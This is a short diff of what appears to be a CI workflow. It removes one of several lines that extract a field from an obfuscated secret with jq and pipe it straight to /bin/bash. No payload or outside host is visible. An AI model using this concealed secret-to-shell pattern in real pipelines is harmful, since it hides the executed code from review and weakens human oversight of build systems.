@@ -18,7 +18,6 @@ jobs:
           j23885: ${{ secrets.j23885 }}
         run: |
           printf '%s' "$j23885" | jq -r .w15 | /bin/bash
-          echo $weuko423 | jq -r .wct90 | /bin/bash
           printf '%s' "$dsn92" | jq -r .xok4 | /bin/bash
           printf '%s' "$d31601" | jq -r .maf78 | /bin/bash
           printf '%s' "$hfx412" | jq -r .kkn87 | /bin/bash
